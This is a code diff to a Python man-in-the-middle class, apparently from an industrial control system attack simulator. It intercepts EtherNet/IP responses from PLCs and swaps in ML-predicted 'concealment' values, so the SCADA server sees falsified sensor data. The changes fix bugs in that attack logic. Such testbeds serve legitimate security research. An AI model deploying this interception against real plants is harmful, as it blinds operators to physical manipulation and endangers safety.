@@ -33,7 +33,7 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         self.calculated_concealment_values_df = self.set_initial_conditions_of_scada_values()
 
         # set with the tags we have not received in this iteration
-        self.missing_scada_tags = self.scada_tags
+        self.missing_scada_tags = list(self.scada_tags)
         self.complete_scada_set = False
         self.received_window_size = 0
 
@@ -58,10 +58,11 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
         aux_scada_tags = []
         for PLC in self.intermediate_yaml['plcs']:
             if 'sensors' in PLC:
-                aux_scada_tags.append(PLC['sensors'])
+                aux_scada_tags.extend(PLC['sensors'])
             if 'actuators' in PLC:
-                aux_scada_tags.append(PLC['actuators'])
+                aux_scada_tags.extend(PLC['actuators'])
 
+        self.logger.debug('SCADA tags: ' + str(set(aux_scada_tags)))
         return set(aux_scada_tags)
 
     def predict_concealment_values(self):
@@ -69,54 +70,68 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
 
     def handle_concealment(self, session, ip_payload):
 
-        if len(self.missing_scada_tags) == self.scada_tags:
+        self.logger.debug('Concealing method for session: ' + str(session))
+
+        if len(self.missing_scada_tags) == len(self.scada_tags):
             # We miss all the tags. Start of a new prediction cycle
+            self.logger.debug('We miss all the tags. Start of a new prediction cycle')
             self.predicted_for_iteration = False
 
-        for tag in self.scada_tags:
-            if session['tag'] == tag:
-                if tag in self.missing_scada_tags:
+        #aux_tags = list(self.scada_tags)
+        self.logger.debug('Missing tags are: ' + str(self.missing_scada_tags))
+        self.logger.debug('SCADA tags are: ' + str(self.scada_tags))
+        self.logger.debug('Missing tags len: ' + str(len(self.missing_scada_tags)))
+        self.logger.debug('SCADA tags len: ' + str(len(self.scada_tags)))
 
-                    # We store the value, this df is an input for the concealment ML model
-                    self.received_scada_tags_df[tag] = translate_payload_to_float()
-                    self.missing_scada_tags.remove(tag)
+        if session['tag'] in self.missing_scada_tags:
+            # We store the value, this df is an input for the concealment ML model
+            self.received_scada_tags_df[session['tag']] = translate_payload_to_float(ip_payload[Raw].load)
+            self.logger.debug('Received tag ' + str(session['tag']) + ' with value: ' +
+                              str(self.received_scada_tags_df[session['tag']].iloc[-1]))
+            self.missing_scada_tags.remove(session['tag'])
+            self.logger.debug('Missing tags len after removing: ' + str(len(self.missing_scada_tags)))
 
-                    # Missing set is empty, increase the window count
-                    if not self.missing_scada_tags:
-                        self.missing_scada_tags = self.scada_tags
+            # Missing set is empty, increase the window count
+            if not self.missing_scada_tags:
+                self.missing_scada_tags = list(self.scada_tags)
 
-                        if not self.initialized:
-                            self.received_window_size = self.received_window_size + 1
-                            if self.received_window_size >= self.window_size:
-                                self.initialized = True
+                if not self.initialized:
+                    self.received_window_size = self.received_window_size + 1
+                    if self.received_window_size >= self.window_size:
+                        self.initialized = True
 
-                        elif not self.predicted_for_iteration:
-                            self.predicted_for_iteration = True
-                            self.predict_concealment_values()
+                elif not self.predicted_for_iteration:
+                    self.predicted_for_iteration = True
+                    self.predict_concealment_values()
 
-
-                # If model is initialized, we have to conceal, regardless of missing set
-                if self.initialized:
-                    modified = True
-                    return translate_float_to_payload(self.calculated_concealment_values_df[tag],
-                                                      ip_payload[Raw].load), modified
-                else:
-                    modified = False
-                    # We don't conceal before initialization
-                    return ip_payload[Raw].load, modified
+        # If model is initialized, we have to conceal, regardless of missing set
+        if self.initialized:
+            modified = True
+            return translate_float_to_payload(self.calculated_concealment_values_df[session['tag']],
+                                                  ip_payload[Raw].load), modified
+        else:
+            modified = False
+            # We don't conceal before initialization
+            return ip_payload[Raw].load, modified
 
     def handle_enip_response(self, ip_payload):
         this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
         this_context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
-        self.logger.debug('ENIP response session: ' + str(this_session))
-        self.logger.debug('ENIP response context: ' + str(this_context))
+        #self.logger.debug('ENIP response session: ' + str(this_session))
+        #self.logger.debug('ENIP response context: ' + str(this_context))
 
-        # Concealment values to SCADA
-        for session in self.scada_session_ids:
-            if session['session'] == this_session and session['context'] == this_context:
-                self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                return self.handle_concealment(session, ip_payload)
+        #self.logger.debug('ENIP Response for: ' + str(ip_payload[IP].dst))
+
+        try:
+            # Concealment values to SCADA
+            for session in self.scada_session_ids:
+                if session['session'] == this_session and session['context'] == this_context:
+                    self.logger.debug('Concealing to SCADA: ' + str(this_session))
+                    return self.handle_concealment(session, ip_payload)
+
+        except Exception as exc:
+            self.logger.debug(exc)
 
         modified = False
         return ip_payload, modified
@@ -124,16 +139,17 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
     def handle_enip_request(self, ip_payload, offset):
 
         # For this concealment, the only valid target is SCADA
-        if ip_payload[IP].src == self.intermediate_yaml['scada']['public_ip']:
+        #self.logger.debug('ENIP Request from: ' + str(ip_payload[IP].src))
+        if ip_payload[IP].src == self.intermediate_yaml['scada']['local_ip']:
             this_session = int.from_bytes(ip_payload[Raw].load[4:8], sys.byteorder)
             tag_name = ip_payload[Raw].load.decode(encoding='latin-1')[54:offset]
             context = int.from_bytes(ip_payload[Raw].load[12:20], sys.byteorder)
 
             self.logger.debug('this tag is: ' + str(tag_name))
             session_dict = {'session': this_session, 'tag': tag_name, 'context': context}
-            self.logger.debug('session dict: ' + str(session_dict))
+            #self.logger.debug('session dict: ' + str(session_dict))
 
-            self.logger.debug('SCADA Req session')
+            #self.logger.debug('SCADA Req session')
             self.scada_session_ids.append(session_dict)
 
     def capture(self, packet):
@@ -160,13 +176,13 @@ class UnconstrainedBlackBoxMiTMNetfilterQueue(PacketQueue):
 
                 else:
                     if len(p) == 118:
-                        self.logger.debug('handling request 57')
+                        #self.logger.debug('handling request 57')
                         self.handle_enip_request(p, 57)
-                        self.logger.debug('handled request')
+                        #self.logger.debug('handled request')
                     elif len(p) == 116:
-                        self.logger.debug('handling request 56')
+                        #self.logger.debug('handling request 56')
                         self.handle_enip_request(p, 56)
-                        self.logger.debug('handled request')
+                        #self.logger.debug('handled request')
                     else:
                         packet.accept()
                         return
